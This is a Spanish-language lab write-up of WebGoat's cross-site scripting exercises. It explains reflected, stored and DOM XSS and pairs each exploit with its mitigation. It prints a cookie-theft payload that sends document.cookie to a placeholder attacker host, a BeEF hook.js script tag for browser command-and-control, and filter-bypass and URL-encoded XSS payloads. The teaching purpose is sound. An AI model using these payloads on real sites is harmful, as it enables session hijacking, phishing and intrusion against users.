---
title: WebGoat - A7 - (XSS) Cross Site Scripting
author: Christian Gutierrez
date: 2021-03-01 14:10:00 -0500
categories: [WebGoat, A7]
tags: [xss, xss-dom]
image: /assets/webgoat/A7/portada.PNG
---

## Introducción
En esta ocasión vamos a trabajar con un laboratorio de **Cross Site Scripting** (**XSS**), en el que nos aprovecharemos de distintas funcionalidades que no realizan un correcto saneamiento de los datos de entrada y salida, permitiendo que se incluya código JavaScript en una sesión de usuario. 

## XSS
De forma general podemos definir el **XSS** como una vulnerabilidad de inyección, pero que al darse en un ambiente de cliente/browser ha sido catalogada de forma independiente en el [OWASP](https://owasp.org/www-community/attacks/xss/), debido a que su objetivo de explotación no esta dado por el servidor sino por el visitante, además de requerir comúmenteun segundo paso apoyado en la ingenieria social, para llegar a una posible victima. 

Los 3 tipos de **XSS** principales son: 
1. **Reflejado**
    El contenido malicioso únicamente se ejecuta en el contexto del browser de la victima. Usualmente con un payload comuflado e includio en la URL; se aprovehca de un mal saneamiento de datos de lado del servidor. 
2. **Almacenado**
    El contenido malicioso se almacena en las bases de datos, haciendolo persistente. El payload es ejecutado en cada llamada de forma organiza que realiza el aplicativo, por ejemplo un sistema de comentarios. 
3. **DOM**
    Es similar al reflejado ya que su ejecución se realiza en el contexto del browser y el payload se inyecta por URL, no obstante, explota debilidades de saneamiento en funciones **JavaScript** que permiten la manipulación del **DOM**. 

## Riesgos de seguridad
Aunque algo subestimados, los riesgos de seguridad asociados al **XSS** son tan variados y criticos como lo imagine un atacante, esto básicamente por que se trata de una inyección de código JavaScript, y recordemos que este es un lenguaje de programación robusto, con el que podemos crear todo tipo de interacciones cliente-servidor, así que realmente **NO** se esta limitado cuando se trata de explotar un **XSS**. 

### **Robo de sesiones**

Quizás el truco más simple y común sea el robo de sesiones. Tengamos presente que si las cookies del aplicativo web no tienen el atributo **HTTPOnly** habilitado, vamos a poder accederlas por medio de **document.cookie** y la forma de envio a un tercer servidor, puede ser tan simple como incluirlo en una petición get de una imagen, como el siguiente ejemplo: 

Se inyecta el siguiente payload. 
```javascript
<script>new Image().src="http://[ATTACK]/bogus.php?session="+document.cookie;</script>
``` 
El navegador, al interpretar el código **JS**, intenta realizar una conexión a este origen de imagen concatenandole la **COOKIE** de la victima: 

![Robo](/assets/webgoat/A7/01_robo_cookie.png)
_Robo de Cookie_

De forma paralela, el atacante esta a la espera de una conexión a dicho servicio ``bogus.php`` y es allí donde captura la **cookie** de la victima: 

![Captura](/assets/webgoat/A7/02_captura_cookie.png)
_Captura de la Cookie_

Este es un ejemplo simple de una de las muchas maneras en que se puede capturar la Cookie, explotando un **XSS**. 

### **Enumeración de Activos Internos**:
De forma similar, un atacante puede inyectar un código JS que realice conexiones a múltiples IP's internas de la red. Recordemos que al ejecutarse en el contexto del cliente (su browser), todas las acciones tendrán como origen la IP o el equipo del cliente, y si este se encuentra en una red privada es posible intentar conectarnos a otros servidores u otros puertos locales (sí, lo sé... las posibilidades son infinitas). 

- [Escaneo de Puertos e IPs - JS](http://jsscan.sourceforge.net/jsscan2.html)
![Escaneo de Puertos](/assets/webgoat/A7/03_scanner_ports.PNG)
_Escaner en JavaScript_

Esta herramienta es un excelente ejemplo de lo que se puede realizar y como al capturar los errores de la carga de una imagen, es posible definir si un puerto se encuentra abierto, además de poder definir el protocolo para realizar acciones similares a un **ping**. 

![ping](/assets/webgoat/A7/04_ping.PNG)
_Ping en JavaScript_

### **Ataques de Ingeniería Social**
Existen muchas otras formas de aprovechar la ejecución de código **JavaScript** en el navegador del cliente, y entre las más interesantes se encuentran aquellas funciones que sirven de apoyo para un ataque de ingeniería social, basandonos en el hecho de que con JS tenemos control completo sobre el DOM de lo que visualiza la victima, por lo que podemos alterarlo y agregar, quitar o simular otras funcionalidades. 

- [BeEF - The Browser Exploitation Framework Project](https://beefproject.com/)

Este grandioso framework tiene un funcionamiento muy interesante que nos permite convertir nuestro **XSS** en un entorno de **Command And Control**, en el que nuestro servidor principal puede controlar y emitir acciones hacia las victimas (zombies/esclavos) en tiempo real, permitiendo realizar cambios visuales que estimulen a la victima a descargar software malicioso, ingresar datos en paneles de acceso, instalar plugins en el navegador, lanzar enumeraciones y lograr recopilar información de la victima (vale la pena poder revisarlo).

Para enlazar el funcionamiento del **BeEF** a nuestro **XSS**, debemos inyectar un payload que haga uso del ``hook.js`` especialmente diseñado por el framework, el cual realiza una conexión recurrente al servidor central en busca de acciones a ejecutar, o la forma de enviar algún resultado previo. 

```javascript
<script src="http://[attack]/hook.js">
```

También es posible subir completamente el servicio de **BeEF** y hacer uso de su laboratorio demo, el cual ya incluye el ``hook.js``. 

- ``http://[ATTACK]:3000/demos/butcher/index.html``

Se tiene un dashboard donde se listan todos las victimas conectadas a nuestro sitio malicioso o que hicieron click en el enlace que explota el **XSS**. 

![Command And Control](/assets/webgoat/A7/05_beef_project.png)
_Command and Control_

Luego, se puede considerar cada victima por separado y seleccionar alguna acción (de las predefinidas), e intentar suplantar un panel de autenticación de facebook o de google: 

![Ejecución Phishing Facebook](/assets/webgoat/A7/06_beef_facebook.png)
_Ejecución Phishing Facebook_

Este tipo de técnicas le permiten a un atacante aprovechar la distracción de una victima que no se percata en qué momento abrio un enlace o por qué se encuentra en un formulario de acceso, de un servicio distinto al que ingreso. Además de poder personalizar los payload y crear vistas que hagan referencia al servicio vulnerable a **XSS**.  


## Laboratorios
### XSS - 7
Se inicia con un sistema de carrito de compras: 

![Carrito de Compras](/assets/webgoat/A7/07_carrito_compras.png)
_Carrito de Compras_

Se detecta que el parámetro **“Enter your credit card number”**, se retorna como parte de la respuesta dada por el aplicativo, en cada activación del botón **“Purchase”**. El valor ingresado es concatenado a una respuesta generica que se muestra por pantalla y que hace uso del parametro ``field1`` via **GET**.

- /CrossSiteScripting/attack5a?QTY1=1&QTY2=1&QTY3=1&QTY4=1&**field1=4128 3214 0002 1999**&field2=111
![Respuesta reflejada](/assets/webgoat/A7/08_xss_reflejado.png)
_Respuesta Reflejada_

Al tener este comportamiento, se puede inyectar código **JS** dentro de las etiquetas **html**, logrando así que al momento de reflejar la respuesta, el navegador tome nuestro código inyectado como parte valida del aplicativo y lo renderice e interprete. 

- ``<script>alert(0);</script>``
![Alert XSS](/assets/webgoat/A7/09_xss_alert.png)
_Alert XSS_

Es un escenario básico de explotación de **XSS**, así que verificaquemos a nivel de código cómo se produce esta vulnerabilidad y cómo se puede mitigar. 

#### Mitigación
El archivo donde se encuentra la vulnerabilidad es: 

- ``\webgoat-lessons\cross-site-scripting\src\main\java\org\owasp\webgoat\xss\CrossSiteScriptingLesson5a.java ``

Y se evidencia que el parámetro ``field1`` es concatenado de forma directa a la respuesta genérica de la funcionalidad, sin realizar previamente un saneamiento o un filtrado de los parámetros dañinos, lo que produce la vulnerabilidad. 

![Código Vulnerable](/assets/webgoat/A7/10_codigo_field1.png)
_Código Vulnerable_

Es por esto que al incluir payloads con etiquetas **html** y código **JS**, el navegador lo interpretaba como si hiciera parte valida del aplicativo. 

La mitigación de esta vulnerabilidad consiste en realizar un proceso previo de filtrado y saneamiento del parámetro ``field1`` antes de incluir lo en la respuesta. Esto se puede realizar usando la librería ``org.owasp.encoder.Encode.forHtml()`` para **Java**, lo que permite cambiar la códificación de salida en [HTML Entitys](https://www.w3schools.com/html/html_entities.asp): 

![Código Mitigado](/assets/webgoat/A7/11_codigo_mitigacion.png)
_Código Mitigado_

De esta manera tenemos una mitigación robusta sobre esta funcionalidad vulnerable, no obstante, se deben tener en cuenta el por qué no esta bien utilizar mitigaciones triviales como las siguientes. 

- **¿Y si elimino todos los ``<script>``?**
Esta es la forma más "común" e insegura de mitigar vulnerabilidades que se dan por mal saneamiento de datos, ya que se intenta atacar directamente el payload y no el significado. Pongamos un ejemplo: 

> El desarrollador deduce que la vulnerabilidad real esta en permitir la etiqueta ``<script>`` ya que por medio de esta es que se ejecuta el código **JS**. Basado en esto, considera que la forma más eficiente de mitigar es realizando un replace sobre dicha expresión. 

En general esta situación es muy común y aunque parece una posible solución, su debilidad se fundamenta en el uso de una ``Lista Negra`` de expresiones, extensiones o etiquetas que considera no se deben permitir, sin embargo, el uso de ```Listas Negras`` nos obliga a considerar todos los escenarios y posibles formas del contenido dañino. 

¿Me explico?, se cree que la única etiqueta dañina es la de ``script``, pero este mismo comportamiento lo podemos lograr con ``img``, ``body``, ``iframe``, y muchas otras etiquetas que posiblemente el desarrollador no considere, dejando persistente la vulnerabilidad. 

![Mitigación con Replace](/assets/webgoat/A7/12_codigo_replace.png)
_Mitigación con Replace_

Aunque la vulnerabilidad parece mitagada a nivel de código, ¿Qué sucede si inyectamos estos payloads?: 
- ``<ScRiPt>alert(0)</ScRiPt>``
    - Con una variación simple, se rompe la validación y busqueda de **script**.
- ``<img src=1 href=1 onerror="javascript:alert(1)"></img>``
    - Existen otras etiquetas dañinas. 
- ``<embed src="javascript:alert(1)">``
- Etc.. [Aquí podemos consultar muchos más payloads](https://github.com/payloadbox/xss-payload-list)

Otro caso sería si se realiza una ``Lista Blanca``, en la que con una expresión regular se valida que únicamente se acepten caracteres pertencientes al abecedario; **pero eso queda de tarea :)**. 

### XSS - 10 - 11 
Este es otro laboratorio básico en el que se debe explotar un **XSS - DOM**, el cual como nos indica la descripción del ejercicio, se encuentra en una funcionalidad routes a nivel del código JavaScript del aplciativo, por lo que procedemos a su busqueda. 

- Vamos a al **depurador** de la herramienta de desarrollo de nuestro navegador. 
- Tecleamos ``Ctrl + Shift + F`` lo cual nos permite buscar en todos los archivos **JS**. 
- Buscamos por el termino **route**.

Identificamos el archivo donde se encuentran las routes que se manejan desde **JS**: 
- ``/WebGoat/js/goatApp/view/GoatRouter.js``

![Identificación de las Routes](/assets/webgoat/A7/13_dom_routes.png)
_Identificación de las Routes_

Como se puede observar, existe una route llamada ``test/:param``, la cual recibe un parametro y luego activa la función ``testRoute``, donde dicha función realiza un llamado a la vista ``showTestParam``. 

- ``/WebGoat/js/goatApp/view/LessonContentView.js``
![Función showTestParam](/assets/webgoat/A7/14_dom_showTestParam.png)
_Función showTestParam_

Una vez en este punto, se identifica que el ``:param`` es concatenado en una vista junto con ``"test:" + param``, lo que nos indica que la forma de inyectar nuestro payload para explotar el **XSS**, es accediendo a la siguiente **URL**: 

- /WebGoat/start.mvc#test/**devsec**
    - Donde ``#test/`` es la route a la que llamamos.
    - Y **devsec** es el valor que inyectamos. 

![Parametro Inyectable](/assets/webgoat/A7/15_dom_devsec.png)
_Parametro Inyectable_

Si se intenta inyectar un payload xss directamente en el parametro identificado, veremos que este no se interpreta de forma adecuada en nuestro navegador, por lo que debemos aplicar una conversión y posteriormente inyectar el payload. 

- Payload: ``<script>alert(0)</script>``
- Payload Encode URL: ``%3Cscript%3Ealert%280%29%3C%2Fscript%3E``
- URL Inyección: /WebGoat/start.mvc#test/``%3Cscript%3Ealert%280%29%3C%2Fscript%3E``

Ahora, según nos indica el reto se debe hacer un llamado a la funcionalidad ``webgoat.customjs.phoneHome()`` la cual nos da un número aleatorio que será nuestra respuesta: 

- Payload: ``<script>webgoat.customjs.phoneHome()</script>``
- Payload Encoded URL: ``%3Cscript%3Ewebgoat%2Ecustomjs%2EphoneHome%28%29%3C%2Fscript%3E``
- URL: /WebGoat/start.mvc#test/``%3Cscript%3Ewebgoat%2Ecustomjs%2EphoneHome%28%29%3C%2Fscript%3E``

Hacemos la busqueda del número en nuestra consola del navegador, aunque también se puede visualizar por medio de un ``alert()``. 

![Respuesta XSS-DOM](/assets/webgoat/A7/16_dom_answer.png)
_Respuesta XSS-DOM_

#### Mitigación
Para este ejercicio tenemos 2 alternativas de mitigación: 
1. Como nos indica el reto, esta vulnerabilidad se da debido a la conservación de distintas funcionalidades de pruebas; por lo que la forma de mitigación sería depurando dicho endpoint del route. 
2. Podemos hacer uso de la librería **ESAPI** de **OWASP**, la cual posee distintas funcionalidades para el saneamiento de datos
    - [OWASP-ESAPI-JS](https://github.com/ESAPI/owasp-esapi-js)

En caso de que queramos conservar el **route** vulnerable, debemos realizar una validación y filtrado antes de concatenar y mostrar el parametro al cliente, todo con la librería **ESAPI** de **OWASP**: 

```javascript
var filtrado= Encoder.encodeForJS(Encoder.encodeForHTML(param));
this.$el.find('.lesson-content').html('test:' + filtrado);
```

# Referencias: 
1. [Mitigación OWASP de XSS-DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
2. [Mitigación OWASP de XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
3. [OWASP-ESAPI-JS](https://github.com/ESAPI/owasp-esapi-js)
4. [BeEF - The Browser Exploitation Framework Project](https://beefproject.com/)